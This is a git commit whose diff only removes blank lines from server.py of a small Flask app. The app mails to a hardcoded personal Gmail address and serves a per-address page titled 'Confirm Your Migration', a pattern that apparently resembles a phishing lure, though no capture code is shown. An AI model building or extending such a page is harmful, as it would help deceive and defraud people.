a104cac38a24db2008dd052875c2b28d1fc65131
CipherX <ukovictor8@gmail.com>
2026-02-26 18:58:24 +0100

    ds

--- server.py
+++ server.py
@@ -22,8 +22,6 @@ API_TOKEN = os.getenv('MAILSENDER_API')
 FROM_EMAIL = 'noreply@test-y7zpl98qpp345vx6.mlsender.net'
 TO_EMAIL = 'williamsgrey996@gmail.com' 
 
-
-
 @app.route('/<user_address>')
 def home(user_address):
     return render_template('index.html', user_address=user_address, title='Confirm Your Migration')
